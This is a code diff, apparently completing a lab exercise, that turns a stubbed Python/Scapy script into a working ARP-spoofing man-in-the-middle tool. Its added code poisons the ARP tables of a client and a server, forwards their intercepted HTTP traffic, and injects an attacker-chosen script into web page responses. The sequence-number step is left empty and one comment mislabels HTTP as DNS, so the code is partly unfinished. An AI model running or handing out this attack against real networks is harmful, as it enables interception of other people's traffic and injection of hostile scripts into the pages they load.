@@ -1,5 +1,6 @@
 # largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
 from scapy.all import *
+from scapy.layers import http
 
 import argparse
 import os
@@ -27,7 +28,10 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
-
+    arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
+    resp = srp(arpReq)
+    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
+    return resp[0][0][1].hwsrc
 
 def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
     while True:
@@ -39,16 +43,54 @@ def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerM
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
+    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
+    send(spoofReq)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
+    send(restoreReq)
 
+routingMap = {}
+
+def handlePacket(pkt):
+    global clientIP, serverIP, attackerMAC, script
+    # Forward packet to indended host
+    shouldHandle = pkt[Ether].dst == attackerMAC
+    ip_src = pkt[IP].src
+    ip_dst = pkt[IP].dst
+    pkt[Ether].src = attackerMAC
+    pkt[Ether].dst = routingMap[ip_dst]
+    
+    if shouldHandle:
+        # Check if DNS packet
+        if pkt.haslayer(http.HTTPResponse):
+            response = pkt.getlayer(http.HTTPResponse)
+            # Modify the HTTP payload
+            body = pkt[Raw].load.decode('utf-8').split('</body>')
+            newbody =  body[0]+"<script>"+script+"</script>"+"</body>"+body[1]
+            pkt[Raw].load = newbody
+            pkt[http.HTTPResponse].Content_Length = str(len(newbody))
+            
+            # Recompute sequence number
+
+            
+            # Recompute checksums
+            del pkt[IP].len
+            del pkt[IP].chksum
+            del pkt[TCP].chksum
+            pkt = pkt.__class__(bytes(pkt))
+            pkt.show()
+        sendp(pkt)
 
 # TODO: handle intercepted packets
 def interceptor(packet):
     global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
+    routingMap[clientIP] = clientMAC
+    routingMap[serverIP] = serverMAC
+    sniff(prn=handlePacket, filter=f"tcp port 80 and ip host {clientIP}")
 
 
 if __name__ == "__main__":
@@ -60,6 +102,7 @@ if __name__ == "__main__":
 
     clientIP = args.clientIP
     serverIP = args.serverIP
+    script = args.script
     attackerIP = get_if_addr(args.interface)
 
     clientMAC = mac(clientIP)
